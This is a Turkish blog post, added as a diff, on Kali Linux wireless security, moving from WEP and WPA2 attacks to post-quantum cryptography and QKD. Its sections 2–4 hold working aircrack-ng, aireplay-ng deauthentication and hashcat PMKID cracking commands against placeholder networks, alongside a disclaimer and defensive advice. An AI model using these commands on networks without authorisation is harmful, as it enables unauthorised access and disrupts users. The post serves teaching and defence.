@@ -1,0 +1,119 @@
+---
+title: "Kali Linux ve Ağ Güvenliği: Komut Satırından Post-Kuantum Kriptografiye"
+subtitle: "Seri: Kablosuz Ağ Güvenliği — Bölüm 1"
+summary: "WEP'ten WPA3'e, monitor modu ve handshake saldırılarından post-kuantum kriptografi ve QKD'ye — kablosuz güvenlikte teknik bir yolculuk ve gelecek."
+image: "/Medium-blog.png"
+publishedAt: "2025-03-01"
+tag: "Siber Güvenlik"
+---
+
+> **Sorumluluk reddi:** Bu yazıdaki tüm teknikler yalnızca **kendi ağınız veya yazılı izniniz olan sistemler** için kullanılmalıdır. İzinsiz ağ erişimi yasadışıdır.
+
+---
+
+## Giriş
+
+Kablosuz güvenlik yazılarının çoğu aynı kalıbı izler: aircrack-ng kur, handshake yakala, wordlist çalıştır, bitti. Bu kalıbı kırmak istiyorum.
+
+Evet, komutları göstereceğim ve saldırı vektörlerini açıklayacağım. Ama asıl soru şu: **WEP'ten WPA3'e giden yolda ne öğrendik — ve kuantum bilgisayarlar bu tabloyu nasıl değiştirecek?**
+
+---
+
+## 1. Temel Komutlar
+
+Kali'de gezinme, servisler ve ağ durumu için temel komutlar:
+
+```bash
+pwd; ls -la /etc/network/
+find / -name "*.cap" 2>/dev/null
+systemctl stop NetworkManager   # Monitor modundan önce
+ip a; ip route show; ss -tulnp
+```
+
+---
+
+## 2. Monitor Modu ve Keşif
+
+```bash
+sudo airmon-ng check kill
+sudo airmon-ng start wlan0
+# Doğrulama: iwconfig wlan0mon
+
+sudo airodump-ng wlan0mon
+sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
+```
+
+Çıktıda BSSID, ESSID, sinyal, şifreleme (WEP/WPA/WPA2/WPA3) ve kimlik doğrulama (PSK/MGT) görülür.
+
+---
+
+## 3. WEP: Müzeye Yakışan Bir Teknoloji
+
+WEP (1997) RC4 ve 24 bitlik IV kullanıyordu. 2^24 ≈ 16M kombinasyon — yoğun ağda IV'ler saatler içinde tekrarlanıyor. Aynı IV + aynı anahtar → düz metin sızıntısı (FMS saldırısı).
+
+```bash
+sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_capture wlan0mon
+# Trafik yoksa: sahte auth + ARP replay
+sudo aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF wlan0mon
+sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF wlan0mon
+sudo aircrack-ng wep_capture-01.cap
+```
+
+**Çıkarım:** WEP 2001'de kırıldı; WPA2 2004'te geldi. Yine de yıllarca milyonlarca WEP ağı kullanıldı. Teknolojik geçiş, matematiksel çöküşten daha yavaş.
+
+---
+
+## 4. WPA/WPA2: Daha Güçlü, Tek Zayıf Nokta
+
+WPA2 CCMP/AES kullanıyor ama PSK modunda **4 yönlü handshake** havada şifresiz gidiyor. Yakala → çevrimdışı brute-force. **PMKID saldırısı (2018):** AP'nin ilk EAPOL çerçevesinden çıkar, istemci gerekmez.
+
+```bash
+# Handshake zorla
+sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c CC:DD:EE:FF:00:11 wlan0mon
+sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
+
+# Veya PMKID + hashcat
+hcxdumptool -i wlan0mon --enable_status=1 -o pmkid.pcapng
+hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng
+hashcat -m 22000 pmkid.hc22000 wordlist.txt
+```
+
+**Kritik:** Başarı tamamen **parola kalitesine** bağlı. Sözlükte olmayan rastgele 20+ karakterli parola, GPU ile bile yıllarca sürebilir.
+
+---
+
+## 5. Savunma Önlemleri
+
+- **Güçlü parolalar:** 16+ karakter, rastgele, sözlük tabanlı değil  
+- **WPA3 / 802.1X:** SAE veya sertifika tabanlı auth — handshake/PMKID saldırıları devre dışı kalır  
+- **VLAN segmentasyonu, HSTS/HTTPS, yönetilen switch’lerde Dynamic ARP Inspection (DAI)**  
+
+---
+
+## 6. Kuantum Tehdidi ve Post-Kuantum Kriptografi
+
+**Mevcut tablo:** WPA2 AES-128 (simetrik) kullanıyor; RSA/ECC ise klasik bilgisayarlar için “zor” problemlere dayanıyor. **Shor algoritması** kuantum bilgisayarda RSA’yı polinom zamanda kırabilir; **Grover** simetrik aramayı karekök kadar düşürür (AES-128 → ~64 bit; AES-256 kullanın). **“Şimdi topla, sonra çöz”** tehdidi şimdiden gerçek: kaydedilen trafik, kuantum bilgisayarlar olgunlaşınca çözülebilir.
+
+**NIST PQC (2022–2024):** CRYSTALS-Kyber (KEM), CRYSTALS-Dilithium ve SPHINCS+ (imza). WiFi henüz PQC içermiyor ama WPA3-Enterprise 192 bit mod destekliyor; TLS/IPsec üzerinden PQC bugün uygulanabilir (OpenSSL 3.x, liboqs).
+
+---
+
+## 7. QKD: Fizikten Güvenlik
+
+**Kuantum Anahtar Dağıtımı (QKD)** kuantum mekaniğinin yasalarına dayanır: bir durumu ölçmek onu bozar (örn. BB84). Dinleme tespit edilebilir. Dezavantajlar: maliyet, sınırlı menzil (~100–150 km), kuantum tekrarlayıcılar olgun değil; kimlik doğrulama hâlâ klasik kripto kullanıyor. Çin’in Micius uydusu 1.200 km üzerinde QKD gösterdi; kablosuz entegrasyon hâlâ 10–15+ yıl uzakta.
+
+---
+
+## 8. Router’lar ve IoT
+
+Varsayılan kimlik bilgileri, yamasız firmware, zayıf RNG, imzasız firmware — hepsi yaygın. **Kontrol listesi:** varsayılan parolayı değiştir (20+ karakter), WPA3 veya WPA2-Enterprise aç, WPS ve uzaktan yönetimi kapat, firmware güncelle, misafir ağını ayır, gereksiz UPnP/Telnet/FTP’yi kapat.
+
+---
+
+## Sonuç
+
+Güvenlik hareketli bir hedeftir. WEP kendi döneminde “yeterince iyi”ydi; WPA2-PSK güçlü parolayla bugün de yeterli. Kuantum tehdidi uzak hissedilebilir ama altyapı değişimi yıllar alır — **hazırlık şimdiden başlamalı.**
+
+**Seri:** Bölüm 2 — WPA3 SAE ve Dragonblood; Bölüm 3 — 802.1X/EAP-TLS; Bölüm 4 — CRYSTALS-Kyber; Bölüm 5 — QKD/BB84 Python’da.
+
+**Etiketler:** `Kali Linux` `Siber Güvenlik` `WiFi Güvenliği` `Post-Kuantum Kriptografi` `WPA3` `QKD` `Etik Hacking` `Ağ Güvenliği`
